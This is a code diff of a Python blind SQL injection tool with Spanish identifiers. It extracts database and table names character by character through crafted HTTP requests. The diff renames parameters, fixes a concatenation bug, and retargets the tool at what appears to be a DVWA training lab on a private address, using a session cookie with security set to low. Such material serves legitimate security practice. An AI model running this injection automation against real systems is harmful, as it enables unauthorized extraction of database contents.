@@ -51,25 +51,25 @@ class SQLInjector:
         print(linea)
         self.__resultadoPositivo = self.__sesion.get(url=linea).content
 
-    def __generarString(self, fila: int, string: str, type: DataBaseOptions, comilla: bool):
+    def __generarString(self, fila: int, string: str, tipo: DataBaseOptions, comilla: bool):
         result = ""
         if comilla:
             result += "'"
         result += self.__tochoComparador0
-        if type == DataBaseOptions.databases:
+        if tipo == DataBaseOptions.databases:
             result += self.__busqurdaDataBase
-        elif type == DataBaseOptions.tables:
-            result = self.__busquedaTables
+        elif tipo == DataBaseOptions.tables:
+            result += self.__busquedaTables
         else:
             result += self.__busqurdaDataBase
         result += self.__tochoComparador1 + str(fila) + self.__tochoComparador2 + \
             str(string.__len__() + 1) + self.__tochoComparador3 + string + self.__parametroDivisor2
         return result
 
-    def __buscarBases(self, fila: int, string: str, type: DataBaseOptions, comilla: bool):
+    def __buscarBases(self, fila: int, string: str, tipo: DataBaseOptions, comilla: bool):
         linea = self.__entrada.replace(self.__parametroDivisor,
-                                       self.__generarString(fila=fila, string=string, type=type, comilla=comilla), 1)
-        print(linea)
+                                       self.__generarString(fila=fila, string=string, tipo=tipo, comilla=comilla), 1)
+        # print(linea)
         lista: list = []
         for caracter in self.__caracteres:
             urldetrabajo = linea.replace(self.__parametroDivisor2, caracter + self.__cola)
@@ -79,29 +79,29 @@ class SQLInjector:
                 lista.append(caracter)
                 break
         if lista.__len__() > 0:
-            string = self.__buscarBases(fila, string + lista[0], type, comilla=comilla)
+            string = self.__buscarBases(fila, string + lista[0], tipo, comilla=comilla)
         return string
 
     # Si se ha inicializado con exito esto devolvera True
     def getIniciado(self):
         return self.__iniciado
 
-    def buscarBlind(self, type: DataBaseOptions, comilla: bool):
+    def buscarBlind(self, tipo: DataBaseOptions, comilla: bool, extra: str):
         resultado: list = []
         if self.__iniciado is True:
             retorno: str = ""
             posicion: int = 0
             while retorno.__len__() > 0 or posicion == 0:
-                retorno = self.__buscarBases(posicion, "", type, comilla)
+                retorno = self.__buscarBases(posicion, "", tipo, comilla)
                 posicion += 1
                 if retorno.__len__() > 0:
                     resultado.append(retorno)
         return resultado
 
 
-dic = {"PHPSESSID": "nemnok27jp2vkhdikff0cc2971", "security": "low"}
-s = SQLInjector("http://10.1.201.89/vulnerabilities/sqli_blind/?id=;PARAM;&Submit=Submit#", dic)
-print(s.buscarBlind(DataBaseOptions.databases, True))
+dic = {"PHPSESSID": "vesf85lptvdtv2hhmfsi6sluc3", "security": "low"}
+s = SQLInjector("http://192.168.0.100/vulnerabilities/sqli_blind/?id=;PARAM;&Submit=Submit#", dic)
+print(s.buscarBlind(DataBaseOptions.tables, True))
 # print(s.generarStringDataBase(0, "mysql"))
 """
 for value in urldividida:
